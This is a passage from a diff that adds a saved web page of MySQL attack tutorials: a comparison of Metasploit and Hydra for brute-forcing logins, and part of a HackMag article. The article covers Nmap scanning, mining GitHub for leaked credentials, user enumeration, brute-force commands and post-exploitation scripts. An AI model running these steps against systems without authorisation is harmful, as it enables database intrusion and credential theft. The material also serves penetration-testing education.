+            (can be very nasty).
+
+          </p><p> b) The actual scan time is decreasing dramatically. When
+            I was scanning with verbose set to true, it took me 5
+            Minutes and 5 Seconds. After deactivating verbose mode, the
+            scan was done in 2 Minutes and 5 Seconds.
+
+          </p><p> Conclusion =&gt; #set VERBOSE false
+
+          </p><p class="separator">
+
+          </p><p> 2. Using THC Hydra
+
+          </p><p> #hydra
+            -L&nbsp;/root/&lt;your_username_file&gt;&nbsp;-P&nbsp;/root/&lt;your_password_file&gt;&nbsp;&lt;IP&gt;
+            mysql
+
+          </p><p class="separator">
+
+          </p><p> 3. Result
+
+          </p><p> So here is an overview of the results (all scans were
+            executed with the same user- and passwordfile).
+
+          <table border="1">
+            <tbody>
+              <tr>
+                <td>mysql_login (verbose mode activated)
+
+                </td><td>5 Minutes 5 Seconds
+
+              </td></tr><tr>
+                <td>mysql_login (verbose mode deactivated)
+
+                </td><td>2 Minutes 5 Seconds
+
+              </td></tr><tr>
+                <td>THC Hydra
+
+                </td><td>4 Minutes 8 Seconds
+          </td></tr></tbody></table>
+
+          </p><p> It was just a very small brute-forcing attack (5.412
+            username/password combinations), but Metasploit took almost
+            25% more time than Hydra with the same wordlists when
+            verbose mode is activated in mysql_login.
+
+          </p><p> If verbose mode is deactivated it is by far the most
+            effective way to brute force mysql.
+
+          </p><p> I don't know if this will scale in the same manner if
+            the brute force attack will have more combinations, but the
+            mysql_login module of Metasploit seems more efficient for
+            mysql brute forcing than THC Hydra.
+
+          </p><p> So let's check this finding manually:
+
+          </p><p> So now we have another login, for a new attack :-)
+        </p></div>
+
+        <p>
+      </p></div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: 7 non-trivial ways to hack your MySQL
+      Database - HackMag </strong></h2>
+
+    <p>Content courtesy of:
+      https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/
+
+
+  
+    </p><div>
+      <div class="entry-content">
+        <p class="addthis_sharing_toolbox">
+
+        </p><p>We will start with a definition. MySQL is a relational
+          database management system with different data storage
+          engines, such as MyISAM, InnoDB, Archive and others. Like
+          most open source projects, it has its own branches, for
+          example, MariaDB. Before going into details, I would like to
+          mention that most of discussed vectors/techniques/bugs apply
+          to various engines and branches, though not always.
+
+        </p><p><span id="more-3951"></span>
+
+        </p><h1 id="looking-for-potential-victims">Looking for Potential
+          Victims</h1>
+
+        <p>Now, let’s go straight to business. To hack someone, you
+          need first to find them. Let’s assume that you already know
+          who your potential victim is, what their IP is or you are in
+          their local network. Now, you need to scan their address
+          (network) for open ports. By default, MySQL uses port 3306,
+          and this is what you will be looking for. The toolbox of each
+          hacker must include ‘Nmap’, a scanner that allows you to find
+          various services and ports on target machines. Here’s an
+          example of scanning command:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a41933240523">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a41933240523-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">PN</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-o">-</span><span class="crayon-v">p</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">port</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">ip</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a41933240523-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><ul>
+          <li>‘-PN’ is a very useful flag that tells the program to
+            skip the host detection stage and go directly to port
+            scanning. It is useful when the machine does not respond to
+            a ping scan while probably having some open ports. In such
+            case, without this flag, ‘Nmap’ will skip such host;
+
+          </li><li>‘-sV’ explores the open ports in order to obtain
+            information about the service.
+        </li></ul>
+
+        <p>UDP scan requires ‘-sU’ flag.</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a4c952131140">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a4c952131140-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">Pn</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">3306</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.114</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a4c952131140-2"><span class="crayon-e">Nmap </span><span class="crayon-e">scan </span><span class="crayon-e">report </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.114</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a4c952131140-3"><span class="crayon-e">Host </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">up</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0.00013s</span><span class="crayon-h"> </span><span class="crayon-v">latency</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a4c952131140-4"><span class="crayon-e">PORT&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">STATE </span><span class="crayon-e">SERVICE </span><span class="crayon-i">VERSION</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a4c952131140-5"><span class="crayon-cn">3306</span><span class="crayon-o">/</span><span class="crayon-e">tcp </span><span class="crayon-e">open&nbsp;&nbsp;</span><span class="crayon-e">mysql&nbsp;&nbsp; </span><span class="crayon-e">MySQL</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">unauthorized</span><span class="crayon-sy">)</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a4c952131140-6">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><div class="wp-caption aligncenter"><a href="https://hackmag.com/wp-content/uploads/2015/04/shodan.jpg"><img alt="Fig. 1. Search results for MySQL in Shodan" src="mysql-brute_files/shodan-1024x482.jpg"></a>
+          <p class="wp-caption-text">Fig. 1. Search results for MySQL in
+            Shodan
+        </p></div>
+
+        <h1 id="github">GitHub</h1>
+
+        <p>One of the coolest things in terms of easy access to
+          databases is to search for source code of projects on GitHub.
+          Before searching and deploying SQL Inj on the website, which
+          can take quite a while (if there are any at all), you can
+          simply go to everyone’s favorite website for the shared
+          development, enter a couple of words and, with some luck, get
+          access to desired source code. For unexplained reasons, many
+          developers upload their projects to public domain — maybe
+          they do it out of stupidity, or maybe because they don’t feel
+          like spending money on private repository, or maybe they just
+          want to share with the entire world their great code, — but
+          GitHub hosts a huge pile of source code ranging from small
+          websites to large projects. Often, this can make your work
+          much easier. For example, if you enter a search request
+          ‘username mysql password database’, you will be stunned to
+          see the number of results. Especially, there are a lot of
+          juicy PHP files with the information on how to connect to the
+          database.
+
+        </p><div class="wp-caption aligncenter"><a href="https://hackmag.com/wp-content/uploads/2015/04/github.jpg"><img alt="Fig. 2. Compelling results from a search for MySQL credentials on GitHub" src="mysql-brute_files/github.jpg"></a>
+          <p class="wp-caption-text">Fig. 2. Compelling results from a
+            search for MySQL credentials on GitHub
+        </p></div>
+
+        <p>So, the first thing you do for a penetration test is to go
+          to GitHub and check the availability of your customer’s
+          source code. If you find something, then you can safely
+          connect to the database, and extract the desired data based
+          on available rights. But if you were unable to find those
+          cherished ‘username/password’ strings, do not despair — you
+          can rummage through the source code of the websites (if there
+          are any) and, instead of performing your audit blindly, do it
+          with the source code of the service. It will greatly
+          facilitate the task of finding the vulnerabilities. Now, you
+          will not be just engaged in a random fuzzy search but check
+          specific vectors built according to source code. For example,
+          you will look at what locations the database has been
+          accessed, whether the filtering of client data is used, etc.
+
+        </p><p>There are different ways to search for injections. You can
+          do it by inserting everywhere a quotation mark automatically
+          or manually (fuzzing); use the method with GitHub in a hope
+          that the developers of researched service have been careless.
+          Finally, you face the moment of truth. You have found your
+          long-awaited injection and, now, you are ready to fully
+          implement it. But the trouble is that you’ve got some urgent
+          business (like your friends asking you to join them for a
+          beer party), or you have been overwhelmed by a terrible
+          procrastination. Don’t worry, you will be rescued by an
+          excellent tool [sqlmap] (goo.gl/gy6TYl), which automates the
+          process of searching and exploiting SQL injections. It will
+          not only find a security hole but also fully exploit it. This
+          tool supports all types of injections. The functionality of
+          sqlmap allows you to: dump databases, automatically search
+          the database, retrieve and decrypt logins and passwords, run
+          ‘cmd’ shell, run the interactive ‘sql’ shell, in which you
+          only need to write your SQL queries to the database, and
+          ‘sqlmap’ will generate the payload for injection. There is a
+          great [Cheet Sheet] (goo.gl/8HAIgD), which presents all
+          features of this tool just on two pages.
+
+        </p><p>There are several tools that will be useful in the
+          difficult task of mastering MySQL. They need no special
+          presentation as you have certainly heard about them more than
+          once (in fact, more than a thousand times). The first one is
+          Metasploit, one of the key programs for hacking that allows
+          you to create exploits and debug them. The second one is
+          Nmap, a scanner which has been many times discussed in this
+          magazine.
+
+        </p><p>There is more than enough information on all these tools,
+          so we will not discuss their use in detail. Those who never
+          used them definitely should do it, and they will find all
+          necessary help through Google or on official websites. In the
+          meantime, we will move further.
+
+        </p><h1 id="collecting-information">Collecting Information</h1>
+
+        <p>Start with the most simple — collect information. In
+          Metasploit, you can do it with
+          ‘auxiliary/scanner/mysql/mysql_version’, a version scanner
+          that can scan the entire pool of addresses:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a52303463059">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a52303463059-1"><span class="crayon-v">msf</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">auxiliary</span><span class="crayon-o">/</span><span class="crayon-v">scanner</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-e">mysql_version</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a52303463059-2"><span class="crayon-e">msf </span><span class="crayon-e">auxilary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_version</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-i">RHOSTS</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.54</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a52303463059-3"><span class="crayon-e">msf </span><span class="crayon-e">auxilary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_version</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">exploit</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a52303463059-4">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>‘Nmap’ also has a module that connects to the server and
+          displays some useful information, such as protocol, version
+          number, status and salt.</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a55700445298">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a55700445298-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sC</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a55700445298-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><h1 id="brute-force">Brute-force</h1>
+
+        <p>Brute-force attack features among the most frequently
+          performed tests and it is aimed at checking for weak or
+          default passwords. But before you start to bruteforce
+          passwords, you can mount a user enumeration attack. It can be
+          mounted against the servers running version 5.x and
+          supporting the old authentication mechanisms (CVE-2012-5615).
+          After performing the scan, you will know what users exist in
+          the database. This significantly reduces the pool of users
+          for brute-force attack.</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a58065798269">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a58065798269-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-t">enum</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a58065798269-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>After compiling your pool of user names and passwords, you
+          can proceed to brute-force attack:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a5b448298374">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a5b448298374-1"><span class="crayon-v">msf</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-st">use</span><span class="crayon-h"> </span><span class="crayon-v">auxiliary</span><span class="crayon-o">/</span><span class="crayon-v">scanner</span><span class="crayon-o">/</span><span class="crayon-v">mysql</span><span class="crayon-o">/</span><span class="crayon-e">mysql_login</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a5b448298374-2"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_login</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-v">USER_FILE</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">root</span><span class="crayon-o">/</span><span class="crayon-v">login</span><span class="crayon-o">/</span><span class="crayon-e">logins</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a5b448298374-3"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_login</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-v">PASS_FILE</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">root</span><span class="crayon-o">/</span><span class="crayon-v">login</span><span class="crayon-o">/</span><span class="crayon-e">password</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a5b448298374-4"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_login</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">set </span><span class="crayon-i">RHOSTS</span><span class="crayon-h"> </span><span class="crayon-cn">172.16.2.54</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a5b448298374-5"><span class="crayon-e">msf </span><span class="crayon-e">auxiliary</span><span class="crayon-sy">(</span><span class="crayon-v">mysql_login</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">exploit</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a5b448298374-6">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>‘Nmap’ uses default password and user lists, but you can
+          always plug in your own lists:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a5d929500358">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a5d929500358-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">brute</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a5d929500358-2"><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">userdb</span><span class="crayon-o">=&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">path</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h">
+                        </span><span class="crayon-e">plug </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">your </span><span class="crayon-e">list </span><span class="crayon-e">of </span><span class="crayon-v">logins</span>
+
+                      </p><p class="crayon-line" id="crayon-5d6aa76ca2a5d929500358-3"><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">passdb</span><span class="crayon-o">=&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">path</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h">
+                        </span><span class="crayon-e">plug </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">your </span><span class="crayon-e">list </span><span class="crayon-e">of </span><span class="crayon-i">passwords</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a5d929500358-4">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>By the way, here’s a great [repository] (goo.gl/hk5Qhs),
+          where you can find the most popular logins, passwords and
+          more. In addition, a brute-force attack usually also includes
+          another simple but quite important check of a blank password
+          for root or anonymous user:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a60903538112">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a60903538112-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">empty</span><span class="crayon-o">-</span><span class="crayon-v">password</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a60903538112-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>
+
+        </p><h1 id="post-exploitation">Post-Exploitation</h1>
+
+        <p>The next important step that begins after obtaining
+          login/password (through injection or brute-force attack) is
+          post-exploitation. I will enumerate the various modules for
+          ‘Nmap’ and their purpose. Module that displays available
+          databases:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a62458025594">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a62458025594-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">databases</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a62458025594-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>Module that displays available users:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a65312767590">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a65312767590-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">users</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a65312767590-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p>Module that displays available variables:</p>
+         
+        <div class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76ca2a67613620747">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76ca2a67613620747-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sV</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">script </span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">variables</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-v">target</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span>
+
+                      </p><p class="crayon-line crayon-striped-line" id="crayon-5d6aa76ca2a67613620747-2">&nbsp;
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
